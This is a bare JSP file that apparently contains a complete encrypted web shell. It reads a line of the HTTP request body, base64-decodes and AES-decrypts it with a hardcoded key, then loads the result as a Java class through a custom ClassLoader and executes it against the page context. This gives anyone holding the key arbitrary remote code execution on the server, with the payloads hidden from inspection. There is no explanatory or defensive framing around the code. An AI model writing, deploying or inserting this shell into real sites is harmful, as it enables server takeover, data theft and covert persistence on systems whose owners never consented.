<%@ page import="java.io.*,java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
String xc = "3c6e0b8a9c15224a";
class U extends ClassLoader {
    U(ClassLoader c) { super(c); }
    public Class g(byte[] b) { return super.defineClass(b, 0, b.length); }
}
%>
<%
String k = xc;
session.putValue("u", k);
Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
c.init(2, new SecretKeySpec(xc.getBytes(), "AES"));
new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
%>
